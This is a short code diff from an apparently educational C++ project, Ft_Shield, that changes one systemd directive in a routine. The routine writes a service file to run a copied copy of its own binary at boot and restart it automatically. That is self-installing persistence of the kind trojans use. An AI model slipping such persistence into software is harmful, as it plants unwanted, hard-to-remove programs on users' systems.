@@ -180,7 +180,7 @@ void	Ft_Shield::setup(char const *me)
 		service << "ExecStart=" << COPY_ELF << " --on-boot" << std::endl;
 		service << "Restart=always" << std::endl;
 		service << "RestartSec=5" << std::endl;
-		service << "StartLimitIntervalSec=60" << std::endl;
+		service << "StartLimitInterval=60s" << std::endl;
 		service << "StartLimitBurst=3" << std::endl;
 		service << "[Install]" << std::endl;
 		service << "WantedBy=multi-user.target" << std::endl;
